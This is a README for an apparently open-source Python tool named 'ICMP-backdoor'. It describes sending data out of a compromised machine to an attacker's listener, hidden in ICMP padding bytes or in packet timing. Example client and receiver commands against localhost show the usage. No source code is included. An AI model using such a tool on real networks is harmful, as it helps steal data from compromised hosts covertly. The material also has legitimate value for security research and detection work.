
<div align="center">
<h1>ICMP-backdoor</h1>

Python-based tool to exfiltrate data through ICMP, supports multiple modes of operation and exfiltration
</div>

<div align="center">
<h2>Usage</h2>
</div>

The tool consists of two scripts, one to be executed from the compromised machine (`client.py`) and the other from the attacker's (`receiver.py`).
There are two methods of exfiltration:

* **Data-based**: exfils the information on the padding bytes of each ICMP packet.
* **Time-based**: the information is transmitted via the frquence of ICMP packets, each of which is a simple packet with no information.

More modes of operation will be researched and added soon.

<div align="center">
<h2></h2>
</div>

The data can be transfered in different ways:

* **Strings** (`-i` switch)
* **Files** (`-f` switch)
* **Shell** (to be implemented soon)

<div align="center">
<h2>Example usage</h2>
</div>

**Client**

```
==> python client.py -d 127.0.0.1 -i "Secret message"
[*] Destination of data: 127.0.0.1
[*] Sending encoded message: "Secret message"
[*] Message sent to 127.0.0.1
```

**Server**

```
==> python receiver.py -i lo
[*] Started listener on interface: lo
[*] Listening mode: 1
[*] Buf length   : 64
[*] Received data: "Secret message"
```


